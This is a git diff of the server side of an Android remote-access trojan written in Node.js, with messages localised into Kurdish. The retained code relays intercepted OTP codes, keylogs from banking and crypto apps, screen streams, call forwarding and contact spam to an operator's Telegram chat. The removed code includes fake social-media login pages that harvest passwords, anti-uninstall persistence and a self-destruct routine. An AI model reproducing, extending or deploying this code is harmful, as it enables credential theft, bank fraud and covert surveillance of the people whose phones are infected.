         const notifFile = path.join(DIRS.NOTIFICATIONS, `${Date.now()}_${notif.app}.json`);
         fs.writeFileSync(notifFile, JSON.stringify(notif, null, 2));
         
-        // Check for OTP/banking
         const isOTP = notif.text && notif.text.match(/\b\d{4,6}\b/);
-        const isBanking = ['bank', 'pay', 'card', 'money'].some(word => 
-            (notif.text && notif.text.toLowerCase().includes(word)) || 
-            (notif.app && notif.app.toLowerCase().includes(word))
-        );
         
-        if (isOTP || isBanking) {
+        if (isOTP) {
             bot.sendMessage(CONFIG.CHAT_ID,
-                `💰 **🔐 Banking/OTP Alert**\n\n` +
+                `💰 **🔐 ئاگاداری OTP**\n\n` +
                 `📱 ئەپ: ${notif.app}\n` +
                 `📌 ناونیشان: ${notif.title}\n` +
                 `📝 پەیام: ${notif.text}\n` +
-                `🔢 OTP: ${notif.text ? notif.text.match(/\b\d{4,6}\b/) : ''}\n` +
-                `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
+                `🔢 OTP: ${notif.text.match(/\b\d{4,6}\b/)}\n` +
+                `⏰ کات: ${new Date(notif.timestamp).toLocaleString('ckb')}`,
                 { parse_mode: 'Markdown' }
             );
         } else {
@@ -549,12 +747,11 @@ class NotificationListener {
                 `📱 ئەپ: ${notif.app}\n` +
                 `📌 ناونیشان: ${notif.title}\n` +
                 `📝 پەیام: ${notif.text}\n` +
-                `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
+                `⏰ کات: ${new Date(notif.timestamp).toLocaleString('ckb')}`,
                 { parse_mode: 'Markdown' }
             );
         }
         
-        // Update stats
         const db = readDB();
         db.stats.notifications_captured++;
         writeDB(db);
@@ -577,7 +774,7 @@ app.post('/api/notification', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 7: SCREEN STREAM (WebRTC)
+// 🚀 SCREEN STREAM (لە V39ەوە)
 // =====================================================
 class ScreenStreamer {
     constructor() {
@@ -593,30 +790,31 @@ class ScreenStreamer {
                 options,
                 startedAt: new Date().toISOString(),
                 frames: 0,
-                active: true,
-                viewers: 0
+                active: true
             };
             
             this.streams.set(stream.id, stream);
             this.activeStreams++;
             
-            // Save stream info
             const streamFile = path.join(DIRS.SCREEN_STREAMS, `${stream.id}.json`);
             fs.writeFileSync(streamFile, JSON.stringify(stream, null, 2));
             
-            // Update stats
             const db = readDB();
             db.stats.screen_streams++;
             writeDB(db);
             
-            bot.sendMessage(CONFIG.CHAT_ID,
-                `📹 **Screen Stream Started**\n\n` +
-                `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-                `📊 Quality: ${options.quality}\n` +
-                `🎞️ FPS: ${options.fps}\n` +
-                `🆔 Stream: ${stream.id.substring(0, 8)}...`,
-                { parse_mode: 'Markdown' }
-            );
+            const client = clients.get(clientId);
+            if (client) {
+                bot.sendMessage(CONFIG.CHAT_ID,
+                    `📹 **Streamی شاشە دەستی پێکرد**\n\n` +
+                    `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+                    `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+                    `📊 کوالیتی: ${options.quality}\n` +
+                    `🎞️ FPS: ${options.fps}\n` +
+                    `🆔 Stream: ${stream.id.substring(0, 8)}...`,
+                    { parse_mode: 'Markdown' }
+                );
+            }
             
             return stream;
         } catch (error) {
@@ -635,11 +833,10 @@ class ScreenStreamer {
             const duration = Math.floor((Date.now() - new Date(stream.startedAt)) / 1000);
             
             bot.sendMessage(CONFIG.CHAT_ID,
-                `⏹️ **Screen Stream Ended**\n\n` +
+                `⏹️ **Streamی شاشە وەستا**\n\n` +
                 `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
-                `📊 Frames: ${stream.frames}\n` +
-                `⏱️ Duration: ${duration}s\n` +
-                `👁️ Viewers: ${stream.viewers}`,
+                `📊 فرەیم: ${stream.frames}\n` +
+                `⏱️ ماوە: ${duration} چرکە`,
                 { parse_mode: 'Markdown' }
             );
         }
@@ -676,15 +873,15 @@ app.post('/api/screen/frame', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 8: SMART KEYLOGGER
+// 🚀 SMART KEYLOGGER (لە V39ەوە)
 // =====================================================
 class SmartKeylogger {
     constructor() {
         this.logs = [];
         this.activeApps = new Map();
         this.bankingApps = [
-            'bank', 'paypal', 'crypto', 'wallet', 'pay', 
-            'cash', 'money', 'coinbase', 'binance', 'trust'
+            'بەنک', 'بانک', 'کاش', 'پارە', 'کریپتۆ',
+            'bank', 'pay', 'crypto', 'wallet', 'cash'
         ];
     }
 
@@ -693,34 +890,35 @@ class SmartKeylogger {
             id: uuidv4(),
             clientId,
             key,
-            app: app || 'system',
+            app: app || 'سیستەم',
             timestamp: new Date().toISOString(),
             isSensitive: this.isSensitiveApp(app)
         };
         
         this.logs.push(log);
         
-        // Save to file
         const logFile = path.join(DIRS.KEYLOGS, `${app}_${new Date().toISOString().split('T')[0]}.log`);
         fs.appendFileSync(logFile, `[${log.timestamp}] ${key}\n`);
         
-        // Special handling for banking apps
         if (this.isSensitiveApp(app)) {
-            bot.sendMessage(CONFIG.CHAT_ID,
-                `💰 **💰 Banking Alert**\n\n` +
-                `📱 ئەپ: ${app}\n` +
-                `⌨️ Key: ${key}\n` +
-                `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-                `⚠️ Sensitive App Detected`,
-                { parse_mode: 'Markdown' }
-            );
+            const client = clients.get(clientId);
+            if (client) {
+                bot.sendMessage(CONFIG.CHAT_ID,
+                    `💰 **💰 ئاگاداری بانکی**\n\n` +
+                    `📱 ئەپ: ${app}\n` +
+                    `⌨️ کلیک: ${key}\n` +
+                    `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+                    `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+                    { parse_mode: 'Markdown' }
+                );
+            }
         }
         
         return log;
     }
 
     isSensitiveApp(app) {
-        return this.bankingApps.some(b => app && app.toLowerCase().includes(b));
+        return this.bankingApps.some(b => app && app.toLowerCase().includes(b.toLowerCase()));
     }
 
     getLogs(app = null) {
@@ -732,13 +930,16 @@ class SmartKeylogger {
 
     startTracking(clientId, app) {
         this.activeApps.set(clientId, app);
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `⌨️ **Smart Keylogger Started**\n\n` +
-            `📱 ئەپ: ${app}\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `⚠️ Will monitor banking activity`,
-            { parse_mode: 'Markdown' }
-        );
+        const client = clients.get(clientId);
+        if (client) {
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `⌨️ **کێڤلۆگەری زیرەک دەستی پێکرد**\n\n` +
+                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+                `📱 ئەپ: ${app}\n` +
+                `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+                { parse_mode: 'Markdown' }
+            );
+        }
     }
 
     stopTracking(clientId) {
@@ -767,346 +968,7 @@ app.post('/api/keylogger/start/:clientId', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 9: SOCIAL MEDIA OVERLAY
-// =====================================================
-class SocialMediaOverlay {
-    constructor() {
-        this.overlays = [];
-        this.templates = {
-            facebook: {
-                name: 'Facebook',
-                logo: 'https://facebook.com/favicon.ico',
-                fields: ['email', 'password']
-            },
-            instagram: {
-                name: 'Instagram',
-                logo: 'https://instagram.com/favicon.ico',
-                fields: ['username', 'password']
-            },
-            whatsapp: {
-                name: 'WhatsApp',
-                logo: 'https://whatsapp.com/favicon.ico',
-                fields: ['phone', 'password']
-            },
-            telegram: {
-                name: 'Telegram',
-                logo: 'https://telegram.org/favicon.ico',
-                fields: ['phone', 'password']
-            }
-        };
-    }
-
-    async createOverlay(platform, clientId) {
-        const template = this.templates[platform];
-        if (!template) return null;
-        
-        const overlay = {
-            id: uuidv4(),
-            platform,
-            clientId,
-            createdAt: new Date().toISOString(),
-            url: this.getFakeLoginUrl(platform),
-            credentials: [],
-            template
-        };
-        
-        this.overlays.push(overlay);
-        
-        // Create fake HTML page
-        const htmlPath = path.join(DIRS.DROPPER, `${platform}_fake_${Date.now()}.html`);
-        const htmlContent = this.generateFakeLoginPage(platform, template);
-        fs.writeFileSync(htmlPath, htmlContent);
-        
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `🎭 **Social Media Overlay Created**\n\n` +
-            `📱 Platform: ${platform}\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `🔗 URL: ${overlay.url}\n` +
-            `📁 HTML: ${htmlPath}`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        return overlay;
-    }
-
-    getFakeLoginUrl(platform) {
-        const urls = {
-            facebook: 'https://facebook-login-verify.com',
-            instagram: 'https://instagram-security.com',
-            whatsapp: 'https://whatsapp-web-verify.com',
-            telegram: 'https://telegram-auth.com'
-        };
-        return urls[platform] || 'https://login-verify.com';
-    }
-
-    generateFakeLoginPage(platform, template) {
-        const fields = template.fields.map(f => 
-            `<input type="${f.includes('password') ? 'password' : 'text'}" name="${f}" placeholder="${f}" required>`
-        ).join('');
-        
-        return `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>${template.name} Login</title>
-                <meta name="viewport" content="width=device-width, initial-scale=1">
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                        background: #f0f2f5;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        height: 100vh;
-                        margin: 0;
-                    }
-                    .login-box {
-                        background: white;
-                        padding: 40px;
-                        border-radius: 8px;
-                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                        width: 350px;
-                    }
-                    h2 {
-                        text-align: center;
-                        color: #1877f2;
-                        margin-bottom: 30px;
-                    }
-                    input {
-                        width: 100%;
-                        padding: 12px;
-                        margin: 8px 0;
-                        border: 1px solid #ddd;
-                        border-radius: 4px;
-                        box-sizing: border-box;
-                    }
-                    button {
-                        width: 100%;
-                        padding: 12px;
-                        background: #1877f2;
-                        color: white;
-                        border: none;
-                        border-radius: 4px;
-                        cursor: pointer;
-                        font-size: 16px;
-                        margin-top: 10px;
-                    }
-                    button:hover {
-                        background: #166fe5;
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="login-box">
-                    <h2>${template.name}</h2>
-                    <form method="POST" action="/api/overlay/capture">
-                        <input type="hidden" name="platform" value="${platform}">
-                        ${fields}
-                        <button type="submit">Log In</button>
-                    </form>
-                </div>
-            </body>
-            </html>
-        `;
-    }
-
-    captureCredentials(platform, credentials) {
-        const overlay = this.overlays.find(o => o.platform === platform);
-        if (overlay) {
-            overlay.credentials.push({
-                ...credentials,
-                timestamp: new Date().toISOString()
-            });
-        }
-        
-        const credFile = path.join(DIRS.PASSWORDS, `${platform}_${Date.now()}.json`);
-        fs.writeFileSync(credFile, JSON.stringify(credentials, null, 2));
-        
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `🔐 **🔐 Credentials Captured**\n\n` +
-            `📱 Platform: ${platform}\n` +
-            `👤 Username: ${credentials.username || credentials.email || credentials.phone}\n` +
-            `🔑 Password: ${credentials.password}\n` +
-            `⏰ Time: ${new Date().toLocaleString()}`,
-            { parse_mode: 'Markdown' }
-        );
-    }
-}
-
-const socialMediaOverlay = new SocialMediaOverlay();
-
-// API endpoints for overlay
-app.post('/api/overlay/create', (req, res) => {
-    const { platform, clientId } = req.body;
-    socialMediaOverlay.createOverlay(platform, clientId).then(overlay => {
-        res.json({ success: true, overlay });
-    });
-});
-
-app.post('/api/overlay/capture', (req, res) => {
-    const credentials = req.body;
-    socialMediaOverlay.captureCredentials(credentials.platform, credentials);
-    res.redirect('https://google.com');
-});
-
-// =====================================================
-// 🚀 FEATURE 10: BATTERY OPTIMIZATION BYPASS
-// =====================================================
-const setupBatteryOptimizationBypass = () => {
-    if (!CONFIG.BATTERY_OPTIMIZATION_BYPASS) return;
-    
-    const bypassScript = `
-        // Android battery optimization bypass
-        public class BatteryOptimization {
-            public static void requestIgnoreBatteryOptimizations(Context context) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    Intent intent = new Intent();
-                    String packageName = context.getPackageName();
-                    PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
-                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                        intent.setData(Uri.parse("package:" + packageName));
-                        context.startActivity(intent);
-                    }
-                }
-            }
-            
-            public static void enableBackgroundRestriction(Context context) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    Intent intent = new Intent();
-                    intent.setAction(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS);
-                    intent.setData(Uri.parse("package:" + context.getPackageName()));
-                    context.startActivity(intent);
-                }
-            }
-        }
-    `;
-    
-    fs.writeFileSync(path.join(DIRS.DROPPER, 'BatteryOptimization.java'), bypassScript);
-    console.log('✅ Battery Optimization Bypass installed');
-};
-
-// =====================================================
-// 🚀 FEATURE 11: ANTI-UNINSTALL
-// =====================================================
-const setupAntiUninstall = () => {
-    if (!CONFIG.ANTI_UNINSTALL) return;
-    
-    const antiUninstallScript = `
-        // Android anti-uninstall via Device Admin
-        public class AntiUninstall extends DeviceAdminReceiver {
-            private static final String TAG = "AntiUninstall";
-            
-            @Override
-            public void onEnabled(Context context, Intent intent) {
-                super.onEnabled(context, intent);
-                Log.d(TAG, "Device admin enabled");
-            }
-            
-            @Override
-            public void onDisabled(Context context, Intent intent) {
-                // Re-enable admin if disabled
-                ComponentName componentName = new ComponentName(context, AntiUninstall.class);
-                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-                
-                // Try to re-enable
-                Intent enableIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                enableIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
-                enableIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security");
-                enableIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(enableIntent);
-                
-                Log.d(TAG, "Attempting to re-enable device admin");
-            }
-            
-            @Override
-            public void onPasswordChanged(Context context, Intent intent) {
-                Log.d(TAG, "Password changed");
-            }
-            
-            @Override
-            public void onPasswordFailed(Context context, Intent intent) {
-                Log.d(TAG, "Password failed");
-            }
-            
-            @Override
-            public void onPasswordSucceeded(Context context, Intent intent) {
-                Log.d(TAG, "Password succeeded");
-            }
-        }
-    `;
-    
-    fs.writeFileSync(path.join(DIRS.DROPPER, 'AntiUninstall.java'), antiUninstallScript);
-    
-    // Create device admin XML
-    const deviceAdminXml = `<?xml version="1.0" encoding="utf-8"?>
-<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
-    <uses-policies>
-        <limit-password />
-        <watch-login />
-        <reset-password />
-        <force-lock />
-        <wipe-data />
-        <expire-password />
-        <encrypted-storage />
-        <disable-camera />
-    </uses-policies>
-</device-admin>`;
-    
-    fs.writeFileSync(path.join(DIRS.DROPPER, 'device_admin.xml'), deviceAdminXml);
-    console.log('✅ Anti-Uninstall module installed');
-};
-
-// =====================================================
-// 🚀 FEATURE 12: BYPASS LOCK SCREEN
-// =====================================================
-class LockScreenBypass {
-    constructor() {
-        this.active = false;
-    }
-
-    wakeUpDevice(clientId) {
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `🔓 **Wake Up Device**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `⚡ Sending wake up command...`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
-            client.ws.send(JSON.stringify({
-                type: 'wake_up',
-                timestamp: Date.now()
-            }));
-        }
-    }
-
-    keepScreenOn(clientId, enable = true) {
-        this.active = enable;
-        
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `${enable ? '🔒' : '🔓'} **Keep Screen ${enable ? 'ON' : 'OFF'}**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `⚡ Screen will ${enable ? 'stay on' : 'normal'}`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
-            client.ws.send(JSON.stringify({
-                type: 'keep_screen',
-                enable,
-                timestamp: Date.now()
-            }));
-        }
-    }
-}
-
-const lockScreenBypass = new LockScreenBypass();
-
-// =====================================================
-// 🚀 FEATURE 13: CALL FORWARDING
+// 🚀 CALL FORWARDING (لە V39ەوە)
 // =====================================================
 class CallForwarding {
     constructor() {
@@ -1114,6 +976,9 @@ class CallForwarding {
     }
 
     forwardCalls(clientId, targetNumber) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
         const forwarding = {
             id: uuidv4(),
             clientId,
@@ -1125,31 +990,28 @@ class CallForwarding {
         
         this.forwardings.set(forwarding.id, forwarding);
         
-        // Save to file
         const forwardFile = path.join(DIRS.CALL_FORWARDING, `${forwarding.id}.json`);
         fs.writeFileSync(forwardFile, JSON.stringify(forwarding, null, 2));
         
-        // Update stats
         const db = readDB();
         db.stats.calls_forwarded++;
         writeDB(db);
         
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `📞 **Call Forwarding Activated**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📱 Target: ${targetNumber}\n` +
-            `🆔 Forward: ${forwarding.id.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'call_forward',
                 target: targetNumber,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📞 **گواستنەوەی پەیوەندی چالاک کرا**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📱 ژمارە: ${targetNumber}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
         
         return forwarding;
     }
@@ -1159,13 +1021,6 @@ class CallForwarding {
         if (forwarding) {
             forwarding.active = false;
             
-            bot.sendMessage(CONFIG.CHAT_ID,
-                `⏹️ **Call Forwarding Stopped**\n\n` +
-                `🆔 Client: ${forwarding.clientId.substring(0, 8)}...\n` +
-                `📊 Calls Forwarded: ${forwarding.forwardedCalls}`,
-                { parse_mode: 'Markdown' }
-            );
-            
             const client = clients.get(forwarding.clientId);
             if (client && client.ws.readyState === WebSocket.OPEN) {
                 client.ws.send(JSON.stringify({
@@ -1173,6 +1028,13 @@ class CallForwarding {
                     timestamp: Date.now()
                 }));
             }
+            
+            bot.sendMessage(CONFIG.CHAT_ID,
+                `⏹️ **گواستنەوەی پەیوەندی وەستا**\n\n` +
+                `🆔 Forward: ${forwardId.substring(0, 8)}...\n` +
+                `📊 پەیوەندی گواستراوە: ${forwarding.forwardedCalls}`,
+                { parse_mode: 'Markdown' }
+            );
         }
     }
 }
@@ -1180,7 +1042,7 @@ class CallForwarding {
 const callForwarding = new CallForwarding();
 
 // =====================================================
-// 🚀 FEATURE 14: CONTACTS SPAM
+// 🚀 CONTACTS SPAM (لە V39ەوە)
 // =====================================================
 class ContactsSpam {
     constructor() {
@@ -1188,6 +1050,9 @@ class ContactsSpam {
     }
 
     async spamAllContacts(clientId, message) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
         const spam = {
             id: uuidv4(),
             clientId,
@@ -1200,26 +1065,25 @@ class ContactsSpam {
         
         this.activeSpams.set(spam.id, spam);
         
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `📨 **Contacts Spam Started**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📝 Message: ${message}\n` +
-            `⚡ Sending...`,
-            { parse_mode: 'Markdown' }
-        );
-        
         const db = readDB();
         db.stats.messages_spammed++;
         writeDB(db);
         
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'spam_contacts',
                 message,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📨 **سپامی کۆنتاکتەکان دەستی پێکرد**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📝 پەیام: ${message}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
         
         return spam;
     }
@@ -1233,8 +1097,8 @@ class ContactsSpam {
             if (sent >= total) {
                 spam.active = false;
                 bot.sendMessage(CONFIG.CHAT_ID,
-                    `✅ **Spam Complete**\n\n` +
-                    `📊 Sent: ${sent}/${total} messages`,
+                    `✅ **سپام تەواو بوو**\n\n` +
+                    `📊 نێردرا: ${sent}/${total} پەیام`,
                     { parse_mode: 'Markdown' }
                 );
                 this.activeSpams.delete(spamId);
@@ -1253,7 +1117,7 @@ app.post('/api/spam/progress', (req, res) => {
 });
 
 // =====================================================
-// 🚀 FEATURE 15: APP KILLER/BLOCKER
+// 🚀 APP KILLER (لە V39ەوە)
 // =====================================================
 class AppKiller {
     constructor() {
@@ -1261,125 +1125,77 @@ class AppKiller {
     }
 
     killApp(clientId, appPackage) {
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `🛑 **Killing App**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📱 App: ${appPackage}`,
-            { parse_mode: 'Markdown' }
-        );
-        
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'kill_app',
                 app: appPackage,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🛑 **کوشتنی ئەپ**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📱 ئەپ: ${appPackage}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
     }
 
     blockApp(clientId, appPackage) {
         this.blockedApps.set(`${clientId}:${appPackage}`, true);
         
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `🚫 **Blocking App**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📱 App: ${appPackage}\n` +
-            `⚡ App will be blocked from opening`,
-            { parse_mode: 'Markdown' }
-        );
-        
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'block_app',
                 app: appPackage,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🚫 **بلۆکی ئەپ**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📱 ئەپ: ${appPackage}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n\n` +
+            `✅ ئەپەکە بلۆک کرا`,
+            { parse_mode: 'Markdown' }
+        );
     }
 
     unblockApp(clientId, appPackage) {
         this.blockedApps.delete(`${clientId}:${appPackage}`);
         
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `✅ **Unblocking App**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📱 App: ${appPackage}`,
-            { parse_mode: 'Markdown' }
-        );
-        
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'unblock_app',
                 app: appPackage,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `✅ **لابردنی بلۆکی ئەپ**\n\n` +
+            `📱 ئەپ: ${appPackage}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
     }
 }
 
 const appKiller = new AppKiller();
 
 // =====================================================
-// 🚀 FEATURE 16: SELF-DESTRUCT
-// =====================================================
-class SelfDestruct {
-    constructor() {
-        this.active = false;
-    }
-
-    async execute(clientId, masterPassword) {
-        if (masterPassword !== CONFIG.ENCRYPTION_KEY.substring(0, 8)) {
-            bot.sendMessage(CONFIG.CHAT_ID,
-                `❌ **Invalid Password**\n\n` +
-                `Self-destruct aborted`,
-                { parse_mode: 'Markdown' }
-            );
-            return false;
-        }
-        
-        this.active = true;
-        
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `💥 **💥 SELF-DESTRUCT INITIATED**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `⏱️ Time: 10 seconds\n` +
-            `⚠️ All data will be wiped`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
-            client.ws.send(JSON.stringify({
-                type: 'self_destruct',
-                timestamp: Date.now()
-            }));
-        }
-        
-        setTimeout(() => {
-            const db = readDB();
-            delete db.clients[clientId];
-            writeDB(db);
-            
-            bot.sendMessage(CONFIG.CHAT_ID,
-                `✅ **Self-destruct Complete**\n\n` +
-                `All client data wiped`,
-                { parse_mode: 'Markdown' }
-            );
-            
-            this.active = false;
-        }, 10000);
-        
-        return true;
-    }
-}
-
-const selfDestruct = new SelfDestruct();
-
-// =====================================================
-// 🚀 FEATURE 17: WIFI & BLUETOOTH CONTROL
+// 🚀 WIFI & BLUETOOTH CONTROL (لە V39ەوە)
 // =====================================================
 class WifiBluetoothControl {
     constructor() {
@@ -1388,66 +1204,202 @@ class WifiBluetoothControl {
     }
 
     toggleWifi(clientId, enable) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
         this.wifiState.set(clientId, enable);
         
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `${enable ? '📶' : '❌'} **WiFi ${enable ? 'ON' : 'OFF'}**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'toggle_wifi',
                 enable,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `${enable ? '📶' : '❌'} **وایفای ${enable ? 'داگیرسا' : 'کوژایەوە'}**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
     }
 
     toggleBluetooth(clientId, enable) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
         this.bluetoothState.set(clientId, enable);
         
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `${enable ? '📱' : '❌'} **Bluetooth ${enable ? 'ON' : 'OFF'}**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...`,
-            { parse_mode: 'Markdown' }
-        );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'toggle_bluetooth',
                 enable,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `${enable ? '📱' : '❌'} **بلوتوس ${enable ? 'داگیرسا' : 'کوژایەوە'}**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
     }
 
     changeDeviceName(clientId, newName) {
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `📝 **Changing Device Name**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📱 New Name: ${newName}`,
-            { parse_mode: 'Markdown' }
-        );
-        
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
                 type: 'change_device_name',
                 name: newName,
                 timestamp: Date.now()
             }));
         }
+        
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📝 **گۆڕینی ناوی ئامێر**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📱 ناوی نوێ: ${newName}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
+            { parse_mode: 'Markdown' }
+        );
     }
 }
 
 const wifiBluetoothControl = new WifiBluetoothControl();
 
 // =====================================================
-// 🚀 WEB INTERFACE
+// 🚀 WEBSOCKET CONNECTION
+// =====================================================
+wss.on('connection', (ws, req) => {
+    const clientId = uuidv4();
+    const clientInfo = {
+        id: clientId,
+        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
+        userAgent: req.headers['user-agent'],
+        connectedAt: new Date().toISOString(),
+        lastSeen: new Date().toISOString(),
+        model: req.headers.model || 'نەزانراو',
+        manufacturer: req.headers.manufacturer || 'نەزانراو',
+        androidVersion: req.headers.android || 'نەزانراو',
+        battery: req.headers.battery || 'نەزانراو',
+        ram: req.headers.ram || 'نەزانراو',
+        storage: req.headers.storage || 'نەزانراو',
+        root: req.headers.root || 'نەزانراو',
